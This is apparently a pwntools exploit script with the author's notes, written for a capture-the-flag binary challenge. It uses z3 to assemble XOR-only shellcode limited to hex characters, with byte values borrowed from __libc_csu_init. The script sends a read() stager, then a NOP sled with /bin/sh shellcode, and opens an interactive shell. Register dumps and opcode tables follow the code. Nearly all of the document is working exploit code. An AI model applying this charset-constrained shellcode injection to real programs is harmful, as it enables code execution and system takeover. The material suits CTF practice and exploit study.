import sys 
# sys.path.append("/home/ex/coding/python/pwn_ninja")
from pinja import ninja_process, fake_debug
from pwn import *
context.arch = 'amd64'
import z3

def find_valid(target : int):
    s = z3.Solver()
    x = z3.BitVec('x', 32)
    y = z3.BitVec('y', 32)

    s.add( z3.Or([ x ==i for i in csu + [ a for a in opts] ]))

    s.add( z3.Or([ y ==i for i in csu + [ a for a in opts] ]))

    s.add(x ^ y== target)
    print(s.check())
    print(s.model())
    return (s.model()[x].as_long(), s.model()[y].as_long())

def lo():
    print(p.dump_regs(['rax','rsi','rcx', 'rdx', 'rbx'], hexxed= True, hint=True))
    print(p.execute_backend_command("x/5i $rip"))

# p = remote("0.cloud.chals.io",23261)
# p = fake_debug("./chal", gdbscript=gdbscript)
p = ninja_process("./chal")


p.add_breakpoint_sym("main+148")
p.go()

p.recvuntil(b"Data:")


opts= b"0123456789ABCDEF"
# 0 Based indexing :facepalm:, first 0's a padding
csu = [0, 0x74, 0x1B, 0x31, 0xDB, 0xF, 0x1F, 0x0, 0x4C, 0x89, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xFF, 0x14, 0xDF, 0x48, 0x83, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]

def find_csu():
    csu = []
    for i in range(0x31, 0x50 ):
        if i in opts:
            csu.append((u8(p.bv.read( p.bv.symbols['__libc_csu_init'][0].address, 1))))
        else:
            csu.append(0)

# rsi rdx already setup
stager = asm("""
xor eax, eax
xor edi,edi 
syscall
""")


shellcode = ''
for bitty in range(len(stager)):
    a = find_valid(stager[bitty])

    if a[0] in opts:
        shellcode += f"xor al, {a[0]}\n"
    else:
        # Index of 0 wrong as its padding, 55th byte is a legit null
        if a[0] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"


    if a[1] in opts:
        shellcode += f"xor al, {a[1]}\nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
    else:
        if a[1] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"

    # CLEAN OUT REG OR add prev byte to solver ( latter)
    if a[0] in opts:
        # stupid me
        shellcode += f"xor al, {a[0]}\n"
    else:
        if a[0] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"

    if a[1] in opts:
        shellcode += f"xor al, {a[1]}\n"
    else:
        if a[1] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \n"



print(shellcode)

# Padding
shellcode = asm(shellcode)
if len(shellcode) % 2 != 0:
    shellcode += b"0"

print(shellcode)
shellcode = bytes.fromhex(shellcode.decode('latin'))
p.send(shellcode)

# Hit breakpoint first
sleep(.3)

# Figure this out
p.set_reg_value("rbx", p.bv.symbols['__libc_csu_init'][0].address)

p.step_into()

# TODO: Sleep in step_into? async issue
sleep(.3)
p.go()

sleep(.3)
p.sendline(b'\x90' *0xff + asm(shellcraft.amd64.linux.sh()))

sleep(.3)
p.go()
p.interactive()



"""
$rax   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$rbx   : 0x00556cf516b450  →  <__libc_csu_init+0> push r15
$rsi   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$rcx   : 0x00556cf516e060  →  "0123456789ABCDEF"
$rdx   : 0x001337133700c6  →  0x00000000003030 ("00"?)


$rsp   : 0x007ffdc37f1b48  →  0x00556cf516b447  →  <main+150> mov eax, 0x0
$rbp   : 0x007ffdc37f1b60  →  0x0000000000000000
$rdi   : 0x007ffdc37f1ab0  →  0x000000000a4241 ("AB\n"?)
$rip   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$r8    : 0xffffffff
$r9    : 0x0
$r10   : 0x00556cf516a5a9  →  0x65766f6d6d656d ("memmove"?)
$r11   : 0x007f4e51f7b6e0  →  <__memmove_avx_unaligned_erms+0> endbr64
$r12   : 0x00556cf516b0b0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffdc37f1c50  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0

rax rsi->Shellcode
rbx->csu
rcx->BSS string
rdx->End
"""

# bv = binaryninja.open_view("./chal")
# dbg = DebuggerController(bv)
# dbg.launch()


"""
NOTES 
     1bc:       34 30                   xor    al, 0x30
     1c2:       34 31                   xor    al, 0x31
     1c8:       34 32                   xor    al, 0x32
     1ce:       34 33                   xor    al, 0x33
     1ce:       34 34                   xor    al, 0x34
     1d4:       34 35                   xor    al, 0x35
     1da:       34 36                   xor    al, 0x36
     1e0:       34 37                   xor    al, 0x37
     1e6:       34 38                   xor    al, 0x38
     1ec:       34 39                   xor    al, 0x39
     1f2:       34 41                   xor    al, 0x41
     1f8:       34 42                   xor    al, 0x42
     1fe:       34 43                   xor    al, 0x43
     204:       34 44                   xor    al, 0x44
     20a:       34 45                   xor    al, 0x45
     210:       34 46                   xor    al, 0x46 

33 43 30                xor    eax, DWORD PTR [rbx+0x30]
33 43 31                xor    eax, DWORD PTR [rbx+0x31]
33 43 32                xor    eax, DWORD PTR [rbx+0x32]
33 43 34                xor    eax, DWORD PTR [rbx+0x34]
33 43 35                xor    eax, DWORD PTR [rbx+0x35]
33 43 36                xor    eax, DWORD PTR [rbx+0x36]
33 43 37                xor    eax, DWORD PTR [rbx+0x37]
33 43 38                xor    eax, DWORD PTR [rbx+0x38]
33 43 39                xor    eax, DWORD PTR [rbx+0x39]
33 43 41                xor    eax, DWORD PTR [rbx+0x41]
33 43 42                xor    eax, DWORD PTR [rbx+0x42]
33 43 44                xor    eax, DWORD PTR [rbx+0x44]
33 43 45                xor    eax, DWORD PTR [rbx+0x45]
33 43 46                xor    eax, DWORD PTR [rbx+0x46]


full rax control
 4211  python3 find_ops.py > optcodes
 4216  grep -v 90 optcodes  > optcodes2
 4219  grep -v bad optcodes2 > optcodes3
 4221  grep -v cmp optcodes3 > optcodes4
 4223  grep -v rex optcodes4 > optcodes5


WRITE:
31 30                   xor    DWORD PTR [rax], esi
31 32                   xor    DWORD PTR [rdx], esi
31 33                   xor    DWORD PTR [rbx], esi
31 36                   xor    DWORD PTR [rsi], esi
31 37                   xor    DWORD PTR [rdi], esi
31 38                   xor    DWORD PTR [rax], edi
31 39                   xor    DWORD PTR [rcx], edi 

30 42 31                xor    BYTE PTR [rdx+0x31], al
30 42 32                xor    BYTE PTR [rdx+0x32], al
30 42 33                xor    BYTE PTR [rdx+0x33], al
30 42 34                xor    BYTE PTR [rdx+0x34], al
30 42 35                xor    BYTE PTR [rdx+0x35], al
30 42 36                xor    BYTE PTR [rdx+0x36], al
30 42 37                xor    BYTE PTR [rdx+0x37], al
30 42 38                xor    BYTE PTR [rdx+0x38], al
30 42 39                xor    BYTE PTR [rdx+0x39], al
30 42 41                xor    BYTE PTR [rdx+0x41], al
30 42 43                xor    BYTE PTR [rdx+0x43], al
30 42 44                xor    BYTE PTR [rdx+0x44], al
30 42 45                xor    BYTE PTR [rdx+0x45], al
30 42 46                xor    BYTE PTR [rdx+0x46], al


49 - 57, 66 - 70

REGS:
    rax bufer space?? easy to change val 
    rsi as final pointer? nop sled  (DON'T CHANGE)
    rbx csi pointer, more XOR for rax

TODO:
    1. Change pointer value 
    2. Change write value 
    3. Write 
    4. Repeat
"""
